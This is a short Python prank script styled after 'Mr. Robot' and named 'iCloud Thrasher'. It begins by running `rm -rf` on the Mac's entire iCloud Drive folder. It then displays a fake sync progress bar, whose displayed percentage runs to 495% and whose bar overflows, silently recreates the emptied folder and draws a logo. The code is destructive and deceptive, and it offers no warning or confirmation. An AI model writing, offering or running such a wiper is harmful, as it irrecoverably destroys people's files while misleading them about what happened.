## deleete all files in icloud of your mac
import os 
os.system('rm -rf ~/Library/Mobile\ Documents/com~apple~CloudDocs/*')
## recreate it from scratch

## make a progress bar that syncs for 5 seconds
import time
import sys

for i in range(100):
    time.sleep(0.1)
    sys.stdout.write('\r')
    sys.stdout.write("[%-20s] %d%%" % ('='*i, 5*i))
    sys.stdout.flush()
os.system('mkdir ~/Library/Mobile\ Documents/com~apple~CloudDocs')
print("Thanks for using iCloud Thrasher Beta 0.1x ")
# make ecorps logo
import turtle
turtle.speed(0)
turtle.bgcolor("black")
turtle.pensize(3)
turtle.color("red")
turtle.hideturtle()
turtle.goto(-300,300)
turtle.pendown()
turtle.goto(-300,-300)
turtle.goto(300,-300)
turtle.goto(300,300)
turtle.goto(-300,300)
turtle.penup()
turtle.goto(0,0)
turtle.pendown()
turtle.goto(0,300)
turtle.goto(300,300)
turtle.goto(300,0)
turtle.goto(0,0)
turtle.penup()
turtle.goto(0,0)
turtle.pendown()
turtle.goto(0,-300)
turtle.goto(300,-300)
turtle.goto(300,0)
turtle.goto(0,0)

turtle.penup()
turtle.penup()
turtle.goto(0,0)
turtle.pendown()
turtle.goto(-300,300)
turtle.goto(-300,0)
turtle.goto(0,0)
turtle.penup()
turtle.goto(0,0)
turtle.pendown()
turtle.goto(-300,300)
turtle.goto(-300,0)
turtle.goto(0,0)

turtle.penup()
turtle.goto(0,0)
turtle.pendown()
turtle.goto(300,300)
turtle.goto(300,0)
turtle.goto(0,0)

turtle.penup()
turtle.goto(0,0)
print("F-CORP SPONSORED BY E-CORP (C) - 2022 Mr.robot")